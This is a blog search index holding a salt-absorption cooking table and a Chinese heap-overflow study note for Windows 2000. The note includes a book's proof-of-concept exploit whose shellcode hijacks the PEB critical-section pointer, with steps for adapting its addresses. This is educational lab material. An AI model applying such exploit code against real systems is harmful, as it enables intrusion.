<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[二厨笔记 #1: 食材吸盐度总结]]></title>
      <url>http://dog.wtf/life/dog2s-cooking-notes-1/</url>
      <content type="html"><![CDATA[<ul>
<li>Title(EN): <em><strong>Dog2’s Cooing Notes #1: Salt Absorption Rate of Food Ingredients</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<blockquote>
<p>学习炒菜已两月有余，觉得有些普适性的经验值得总结，因此在此记录一下。</p>
<p>本篇总结一下不同食材的吸盐度。</p>
</blockquote>
<p>一道菜通常由多种食材混合烹制而成，其咸味轻重会直接影响口感。不同食材对盐的吸收能力不尽相同，因此较好地平衡不同食材的咸度是佳作的重要之一。但网上绝大多数菜谱或教程很少考虑这一点，大多数菜谱都是在所有食材都已入锅且烹制即将完成前放入盐的，这容易造成一道菜最终由于不同食材咸淡不均而影响口感。</p>
<ul>
<li>下表记录在炒制或煮制过程中不同食材对盐的吸收难易程度，完全根据个人经验，因此未必准确，如有不妥欢迎指正。虽然此处所记录的是吸盐难易，但也可理解为相关食材入味（酸/甜/苦/辣）的难易程度。</li>
<li>可以参考下表调整烹制时食材的形状，或调整盐与各种食材入锅的先后，以平衡不同食材的咸度。</li>
<li>吸盐度0-5分，5分表示极易吸盐，0分表示极难吸盐。</li>
<li>下表按首字拼音首字母升序排列。</li>
</ul>
<a id="more"></a>
<table>
<thead>
<tr>
<th style="text-align:center">食材</th>
<th style="text-align:center">形状</th>
<th style="text-align:center">吸盐度</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">白菜</td>
<td style="text-align:center">叶片</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">白萝卜</td>
<td style="text-align:center">切片</td>
<td style="text-align:center">3.5</td>
</tr>
<tr>
<td style="text-align:center">包菜</td>
<td style="text-align:center">手撕片</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">大蒜</td>
<td style="text-align:center">切碎粒</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">黄豆芽</td>
<td style="text-align:center"></td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">胡萝卜</td>
<td style="text-align:center">丁</td>
<td style="text-align:center">2.5</td>
</tr>
<tr>
<td style="text-align:center">茄子</td>
<td style="text-align:center">丁/条</td>
<td style="text-align:center">4.5</td>
</tr>
<tr>
<td style="text-align:center">鸡蛋</td>
<td style="text-align:center">搅拌后煎块</td>
<td style="text-align:center">3.6</td>
</tr>
<tr>
<td style="text-align:center">鸡蛋</td>
<td style="text-align:center">搅拌后入汤</td>
<td style="text-align:center">3.4</td>
</tr>
<tr>
<td style="text-align:center">金针菇</td>
<td style="text-align:center"></td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">木耳</td>
<td style="text-align:center">小朵</td>
<td style="text-align:center">1.5</td>
</tr>
<tr>
<td style="text-align:center">藕</td>
<td style="text-align:center">丁</td>
<td style="text-align:center">3.4</td>
</tr>
<tr>
<td style="text-align:center">青椒</td>
<td style="text-align:center">丝</td>
<td style="text-align:center">1.5</td>
</tr>
<tr>
<td style="text-align:center">土豆</td>
<td style="text-align:center">薄片</td>
<td style="text-align:center">2.8</td>
</tr>
<tr>
<td style="text-align:center">土豆</td>
<td style="text-align:center">细丝</td>
<td style="text-align:center">2.8</td>
</tr>
<tr>
<td style="text-align:center">杏鲍菇</td>
<td style="text-align:center">切片</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">有机花菜</td>
<td style="text-align:center">切小朵</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">猪肉</td>
<td style="text-align:center">排骨</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">猪肉</td>
<td style="text-align:center">丝</td>
<td style="text-align:center">3.2</td>
</tr>
</tbody>
</table>
<p>尽信书不如无书，食谱亦然。在看完菜谱并了解了其中不同食材的入锅顺序后，我们可以结合上表总结的食材吸盐度来调整盐的放入方式，比如可以将通常的起锅前一次性放入改为分次放入，并合适掌控放入量，甚至可以考虑更改食材的放入顺序，相信有时可以收获超越原菜谱水准的意外惊喜。</p>
<p>接下来的几篇会分享一些基于这种方法改良原有菜谱或者“创造”新菜谱的方法。</p>
<p>祝君烧得一手好菜~</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[堆溢出学习笔记(Win2K) (下)]]></title>
      <url>http://dog.wtf/tech/heap-overflow-learning-notes-2/</url>
      <content type="html"><![CDATA[<ul>
<li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #2</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h2 id="0x02-堆溢出原理及利用"><a href="#0x02-堆溢出原理及利用" class="headerlink" title="0x02 堆溢出原理及利用"></a>0x02 堆溢出原理及利用</h2><hr>
<h3 id="1-堆溢出原理"><a href="#1-堆溢出原理" class="headerlink" title="1. 堆溢出原理"></a>1. 堆溢出原理</h3><blockquote><p>堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新的新块“链入”空表。</p>
<p>所有“卸下”和“链入”堆块的工作都发生在链表，如果我们能伪造链表结点的指针，在“卸下”和“链入”的过程中就有可能获得一次读写内存的机会。</p>
<p>堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)，然后再分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
<p>我们把这种能够向内存任意位置写入任意数据的机会成为”DWORD SHOOT“。注意：DWORD SHOOT发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹（4字节恶意数据）。</p>
<p>这里举一个例子来说明链表操作中DWORD SHOOT究竟是怎样发生的。将一个结点从双向链表中“卸下”的函数很可能是类似这样的。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote><p>按照这个函数的逻辑，正常拆卸过程中链表的变化过程如图5.3.1所示。</p>
<p>当堆溢出发生时，非法数据可以淹没下一个堆块块首。这是，块首是可以被攻击者控制的，即块首中存放的前向指针（flink）和后向指针（blink）是可以被攻击者伪造的。当这个堆块被从双向链表中”卸下“时，node -&gt; blink -&gt; flink = node -&gt; flink 将把伪造的flink指针值写入伪造的blink所指的地址中去，从而发生DWORD SHOOT。这个过程如图5.3.2所示。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P163-164</cite></footer></blockquote>
<img src="/tech/heap-overflow-learning-notes-2/0day_5_3_1.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P165 -> 图5.3.1" title="《0day安全：软件漏洞分析技术》(第二版) -> P165 -> 图5.3.1">
<img src="/tech/heap-overflow-learning-notes-2/0day_5_3_2.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P165 -> 图5.3.2" title="《0day安全：软件漏洞分析技术》(第二版) -> P165 -> 图5.3.2">
<a id="more"></a>
<h3 id="2-堆溢出利用"><a href="#2-堆溢出利用" class="headerlink" title="2. 堆溢出利用"></a>2. 堆溢出利用</h3><blockquote><p>DWORD SHOOT的常用目标（Windows XP SP1之前的平台）大概可以概括为以下几类。</p>
<p>(1) 内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。例如，更改身份验证函数的返回值就可以直接通过认证机制。2.2节中修改邻接变量的小试验就是这种利用方式的例子。在这种应用场景中，DWORD SHOOT要比栈溢出强大得多，因为栈溢出时溢出的数据必须连续，而DWORD SHOOT可以更改内存中任意地址的数据。</p>
<p>(2) 代码逻辑：修改代码段重要函数的关键逻辑有时可以达到一定攻击效果。例如，程序分支处的判断逻辑，或者把身份认证函数的调用指令覆盖为0x90(nop)。这种方法有点类似于软件破解技术中的”爆破“——通过更改一个字节而改变整个程序的流程，第1章中的破解小试验就是这种应用的例子。</p>
<p>(3) 函数返回地址：栈溢出修改函数返回地址能够劫持进程，堆溢出也一样可以利用DWORD SHOOT更改函数返回地址。但由于栈帧移位的原因，函数返回地址往往是不固定的。甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有一定局限性，因为移动的靶子不好瞄准。</p>
<p>(4) 攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块（P.E.B）中的U.E.F（Unhandled Exception Filter）、线程环境块（T.E.B）中存放的第一个S.E.H指针（T.E.H）。</p>
<p>(5) 函数指针：系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功劫持进程。但可惜的是，不是每一个漏洞都可以使用这项技术，这取决于软件的开发方式。</p>
<p>(6) P.E.B中线程同步函数的入口地址：天才的黑客们发现在每个进程的P.E.B中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且在进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的其中一个，那么在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于P.E.B的位置始终不会变化，这对指针在P.E.B中的偏移也始终不变，这使得利用堆溢出开发出适用于不同操作系统版本和补丁版本的exploit成为可能。这种方法一经提出就立刻成为Windows平台下堆溢出哭一边给的是最经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳机就是了。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P169-170</cite></footer></blockquote>
<h4 id="1-利用P-E-B（进程环境块）实施攻击"><a href="#1-利用P-E-B（进程环境块）实施攻击" class="headerlink" title="(1) 利用P.E.B（进程环境块）实施攻击"></a>(1) 利用P.E.B（进程环境块）实施攻击</h4><h5 id="1-P-E-B利用原理"><a href="#1-P-E-B利用原理" class="headerlink" title="1) P.E.B利用原理"></a>1) P.E.B利用原理</h5><blockquote><p>Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量（semaphore）、临界区（critical section）等。许多操作都要用到这些同步机制。</p>
<p>当进程退出时，ExitProcess()函数要做很多善后工作，其中必然需要用到临界区函数RtlEnterCriticalSection()和RtlLeaveCriticalSection()来同步线程防止“脏数据”的产生。</p>
<p>不知什么原因，微软的工程师似乎堆ExitProcess()情有独钟，因为它调用临界区的方法比较特殊，是通过进程环境块P.E.B中偏移0x20处存放的函数指针来间接完成的。具体说来就是在0x7FFDF020处存放着指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存放着指向RtlLeaveCriticalSection()的指针。</p>
<p><em><strong>题外话：从Windows 2003 Server开始，微软已经修改了这里的实现。</strong></em></p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P170</cite></footer></blockquote>
<h5 id="2-实验"><a href="#2-实验" class="headerlink" title="2) 实验"></a>2) 实验</h5><p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改P.E.B中0x20处存放的指向RtlEnterCriticalSection()函数的指针，导致程序需要调用它时实际却执行了shellcode。</p>
<p>实验代码如下:</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P171 -> heap_PEB.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span><br><span class="line">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span><br><span class="line">		</span><br><span class="line">POC code of chapter 6.4 in book "Vulnerability Exploit and Analysis Technique"</span><br><span class="line"> </span><br><span class="line">file name	: heap_PEB.c</span><br><span class="line">author		: failwest  </span><br><span class="line">date		: 2007.04.04</span><br><span class="line"></span><br><span class="line">description	: demo show of heap overrun, shellcode was executed</span><br><span class="line">			  function pointer of RtlEnterCriticalSection was changed in PEB</span><br><span class="line">			  via DWORD shooting</span><br><span class="line">			  Some address may need to reset via run time debugging</span><br><span class="line"></span><br><span class="line">Noticed		:	1 only run on windows 2000</span><br><span class="line">				2 complied with VC 6.0</span><br><span class="line">				3 build into release version</span><br><span class="line">				4 used for run time debugging</span><br><span class="line">version		: 1.0</span><br><span class="line">E-mail		: failwest@gmail.com</span><br><span class="line">		</span><br><span class="line">	Only for educational purposes    enjoy the fun from exploiting :)</span><br><span class="line">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span><br><span class="line">char shellcode[]=</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";//200 bytes 0x90</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line">char shellcode[]=</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span><br><span class="line">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span><br><span class="line">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span><br><span class="line">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span><br><span class="line">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span><br><span class="line">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span><br><span class="line">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span><br><span class="line">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span><br><span class="line">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span><br><span class="line">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span><br><span class="line">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span><br><span class="line">"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block</span><br><span class="line">"\x88\x06\x52\x00\x20\xf0\xfd\x7f";</span><br><span class="line">//0x00520688 is the address of shellcode in first heap block </span><br><span class="line">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span><br><span class="line">//and will be called by ExitProcess() at last</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">"\xB8\x20\xF0\xFD\x7F"</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">"\xBB\x4C\xAA\xF8\x77"</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">"\x89\x18"</span>				<span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x52\x00\x20\xf0\xfd\x7f"</span>;</span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>代码中第3个为最终版本的shellcode，这个shellcode效果是执行MessageBoxA()弹出一个对话框，但据0day书中解释，shellcode中调用的函数也需要使用临界区，因此在其执行过程中也需要调用P.E.B中0x20偏移处的指针指向的RtlEnterCriticalSection()函数，但该处的函数指针在shellcode执行时已经被我们掉包，因此会导致shellcode中的函数执行不成功。为了避免这个问题，需要在shellcode调用关键函数前修复该处的值，shellcode中77-79行的代码就是进行修复工作的。</p>
<p>首先，去掉代码104行处的注释，通过INT 3中断进入OllyDBG进行调试。</p>
<p>由于RtlEnterCriticalSection()函数的实际地址在不同操作系统上有所差异，因此此处需要手动确定，由于P.E.B的地址是固定的，为0x7FFDF000，因此在内存查看窗口中通过Ctrl+G并键入0x7FFDF020来到其偏移0x20处观察，得到在我的系统中RtlEnterCriticalSection()函数的地址为0x77F82060，因此将shellcode中78行处的修复代码中的该函数地址进行修改，本行整体改为”\xBB\x60\x20\xF8\x77”，其中\xBB为MOV EBX的机器码。</p>
<p>接着，观察shellcode中第92行，0day书中尾块的地址为0x00520688，而我的机器上为0x00360688，因此将其中的\x52修改为\x36即可。</p>
<p>最后，再将第104行的INT 3中断注释掉，重新编译运行程序，即可成功弹窗。这里有个问题，如果不注释掉该行代码，INT 3中断后进入OllyDBG进行调试，最终程序会终止在ntdll的内核代码中，不会成功弹窗，也不会执行到我们的shellcode，我尝试了很多修改选项或者不同断点的方式都无法解决这个问题，由于它不影响我们对利用P.E.B进行堆溢出利用的理解，因此放在后面讨论。</p>
<h5 id="3-关于其中细节的思考"><a href="#3-关于其中细节的思考" class="headerlink" title="3) 关于其中细节的思考"></a>3) 关于其中细节的思考</h5><p>虽然无法跟踪调试堆溢出的过程，但是我们可以观察一下堆溢出之前的堆内存的分布，当代码执行到106行memcpy()调用之前时，观察空表索引区，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_1_1.png" alt="图2.2.1.1" title="图2.2.1.1">
<p>观察堆数据区：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_1_2.png" alt="图2.2.1.2" title="图2.2.1.2">
<p>可以看到尾块的前后向指针均指向0x178处的Freelist[0]。</p>
<p>接着执行代码到完成106行的memcpy操作，再观察对数据区：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_1_3.png" alt="图2.2.1.3" title="图2.2.1.3">
<p>由于h1处发生溢出，0x688处写入的shellcode会越界覆盖到0x758处的尾块的前后向指针，前向指针flink被修改为0x00360688，后向指针blink被修改为0x7FFDF020。由于当前尾块与Freelist[0]相互串接，而h2会申请(1+1) x 8 Byte的空间，当前Freelist[2]中没有空闲块，因此会从尾块中”分割“所需空间给h2，这需要将当前尾块从Freelist[0]中”卸下“，而前面的堆溢出利用原理中介绍过，将一个结点从双向链表中“卸下”的函数很可能是类似这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，node可理解即为该节点数据区（而非块首）的地址，本例中可如下理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD ** node = <span class="number">0x00360758</span>; <span class="comment">//node指向尾块数据区</span></span><br><span class="line"></span><br><span class="line">node值为<span class="number">0x00360758</span>。</span><br><span class="line">*node值为<span class="number">0x00360688</span>，是被覆盖后的前向指针flink。</span><br><span class="line">*(node+<span class="number">4</span>)值为<span class="number">0x7FFDF020</span>，是被覆盖后的后向指针blink。</span><br></pre></td></tr></table></figure>
<p>则如下操作就可以这样理解:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -&gt; flink 等价于 *(node+<span class="number">0</span>)，即*node</span><br><span class="line">node -&gt; blink 等价于 *(node+<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>因此，上面的代码可以理解为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	*(*(node+<span class="number">4</span>)) = *node;</span><br><span class="line">	*(*node+<span class="number">4</span>) = *(node+<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此本例可最终理解为进行了如下操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Memory(<span class="number">0x7FFDF020</span>) = <span class="number">0x00360688</span>; <span class="comment">//P.E.B DWORD SHOOT</span></span><br><span class="line">Memory(<span class="number">0x0036068C</span>) = <span class="number">0x7FFDF020</span>; <span class="comment">//指针反射</span></span><br></pre></td></tr></table></figure>
<p>如上代码中第一行向内存地址0x7FFDF020写入了DWORD值0x00360688，篡改了该处原来存储的指向临界区函数RtlEnterCriticalSection()的指针，因此在程序出错退出调用ExitProcess()时，就会需要到P.E.B便宜0x20处获得指向RtlEnterCriticalSection()函数的指针，结果获得的是shellcode的地址0x00360688，因此转而去执行shellcode。</p>
